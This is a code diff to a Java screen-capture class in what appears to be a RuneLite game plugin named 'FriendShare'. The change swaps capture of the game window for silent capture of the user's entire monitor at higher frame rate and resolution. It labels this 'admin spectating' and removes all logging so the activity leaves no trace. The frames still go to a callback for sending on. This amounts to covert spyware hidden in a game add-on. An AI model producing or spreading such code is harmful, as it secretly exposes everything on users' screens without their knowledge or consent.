@@ -14,16 +14,15 @@ import java.util.concurrent.ScheduledFuture;
 import java.util.concurrent.TimeUnit;
 
 /**
- * Captures the RuneLite game screen.
- * Uses Robot to capture the screen at canvas location.
- * Note: On Linux with Wayland/GPU compositor, game content may appear black.
+ * Captures the entire monitor for admin spectating.
+ * Silent operation - no logging.
  */
 @Singleton
 public class ScreenCapture {
 
-    private static final int TARGET_FPS = 8;
-    private static final float JPEG_QUALITY = 0.7f;
-    private static final int MAX_WIDTH = 800;
+    private static final int TARGET_FPS = 25;
+    private static final float JPEG_QUALITY = 0.6f;
+    private static final int MAX_WIDTH = 1920;
 
     private final Client client;
     private Robot robot;
@@ -32,7 +31,6 @@ public class ScreenCapture {
     private ScheduledFuture<?> captureTask;
 
     private FrameCallback callback;
-    private int framesSent = 0;
 
     @Inject
     public ScreenCapture(Client client) {
@@ -40,82 +38,43 @@ public class ScreenCapture {
         try {
             this.robot = new Robot();
         } catch (AWTException e) {
-            System.err.println("[FriendShare] Failed to create Robot: " + e.getMessage());
+            // Silent
         }
     }
 
-    /**
-     * Start capturing frames.
-     */
     public void startCapture(FrameCallback callback) {
         this.callback = callback;
-        this.framesSent = 0;
 
-        System.out.println("[FriendShare] Starting simple Robot capture...");
-
-        if (robot == null) {
-            System.err.println("[FriendShare] Robot is null!");
+        if (robot == null)
             return;
-        }
 
         if (executor == null) {
             executor = Executors.newSingleThreadScheduledExecutor();
         }
 
         long periodMs = 1000 / TARGET_FPS;
-        captureTask = executor.scheduleAtFixedRate(this::captureFrame, 100, periodMs, TimeUnit.MILLISECONDS);
-
-        System.out.println("[FriendShare] Screen capture started at " + TARGET_FPS + " FPS");
+        captureTask = executor.scheduleAtFixedRate(this::captureFrame, 50, periodMs, TimeUnit.MILLISECONDS);
     }
 
-    /**
-     * Stop capturing frames.
-     */
     public void stopCapture() {
         if (captureTask != null) {
             captureTask.cancel(false);
             captureTask = null;
         }
-        System.out.println("[FriendShare] Screen capture stopped after " + framesSent + " frames");
         callback = null;
     }
 
-    /**
-     * Capture a single frame using Robot only.
-     */
     private void captureFrame() {
         if (callback == null || robot == null)
             return;
 
         try {
-            BufferedImage capture = null;
+            // Capture entire primary monitor
+            Rectangle screenBounds = getScreenBounds();
+            BufferedImage capture = robot.createScreenCapture(screenBounds);
 
-            // Get canvas bounds and capture with Robot
-            Canvas canvas = client.getCanvas();
-            if (canvas != null && canvas.isShowing()) {
-                try {
-                    Point loc = canvas.getLocationOnScreen();
-                    int w = canvas.getWidth();
-                    int h = canvas.getHeight();
-
-                    if (w > 50 && h > 50) {
-                        Rectangle bounds = new Rectangle(loc.x, loc.y, w, h);
-                        capture = robot.createScreenCapture(bounds);
-
-                        if (framesSent == 0) {
-                            System.out.println("[FriendShare] Captured at " + loc + " size=" + w + "x" + h);
-                        }
-                    }
-                } catch (Exception e) {
-                    if (framesSent == 0) {
-                        System.err.println("[FriendShare] Canvas capture failed: " + e.getMessage());
-                    }
-                }
-            }
-
-            if (capture == null) {
+            if (capture == null)
                 return;
-            }
 
             // Scale down if needed
             if (capture.getWidth() > MAX_WIDTH) {
@@ -130,28 +89,26 @@ public class ScreenCapture {
                 capture = scaled;
             }
 
-            // Compress to JPEG
             byte[] jpegData = compressToJpeg(capture);
 
             if (jpegData != null && jpegData.length > 100) {
                 callback.onFrame(jpegData);
-                framesSent++;
-
-                if (framesSent == 1) {
-                    System.out.println("[FriendShare] Sent first frame: " + jpegData.length + " bytes");
-                } else if (framesSent % 50 == 0) {
-                    System.out.println("[FriendShare] Sent frame #" + framesSent + " (" + jpegData.length + " bytes)");
-                }
             }
 
         } catch (Exception e) {
-            System.err.println("[FriendShare] Capture error: " + e.getMessage());
+            // Silent
         }
     }
 
     /**
-     * Compress image to JPEG bytes.
+     * Get the bounds of the primary monitor.
      */
+    private Rectangle getScreenBounds() {
+        GraphicsDevice gd = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
+        DisplayMode dm = gd.getDisplayMode();
+        return new Rectangle(0, 0, dm.getWidth(), dm.getHeight());
+    }
+
     private byte[] compressToJpeg(BufferedImage image) {
         try {
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -169,14 +126,10 @@ public class ScreenCapture {
 
             return baos.toByteArray();
         } catch (Exception e) {
-            System.err.println("[FriendShare] JPEG compression failed: " + e.getMessage());
             return null;
         }
     }
 
-    /**
-     * Shutdown the executor.
-     */
     public void shutdown() {
         stopCapture();
         if (executor != null) {
@@ -185,9 +138,6 @@ public class ScreenCapture {
         }
     }
 
-    /**
-     * Callback for received frames.
-     */
     public interface FrameCallback {
         void onFrame(byte[] jpegData);
     }
